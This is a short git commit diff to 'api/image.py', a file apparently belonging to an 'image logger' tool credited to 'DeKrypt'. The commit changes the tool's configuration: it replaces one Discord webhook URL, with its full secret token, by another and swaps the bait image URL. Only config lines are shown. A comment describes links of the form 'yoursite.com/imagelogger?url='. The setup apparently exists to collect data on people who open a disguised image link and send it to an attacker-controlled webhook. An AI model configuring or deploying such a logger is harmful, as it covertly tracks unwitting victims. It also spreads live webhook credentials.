731c8d9aede045205c4249a262ea8d8a9996a623
KylosMods <140790726+KylosMods@users.noreply.github.com>
2026-07-11 22:46:39 -0700

    image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1525739432336949309/HBM0I6oNb4xZHzrcs-8tCHsDOWXhAfu2m4UTbXvbuFUt2MqZvs9L_Q2OrhZrlPRJD2p0",
+    "image": "https://media.discordapp.net/attachments/1514495618503151667/1517849566899339365/image.png?ex=6a541f51&is=6a52cdd1&hm=c3577b1c4da7537486db95d60182679bd5f4f7c19313c248ab436e96ceada8d1&=&format=webp&quality=lossless&width=1321&height=997", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
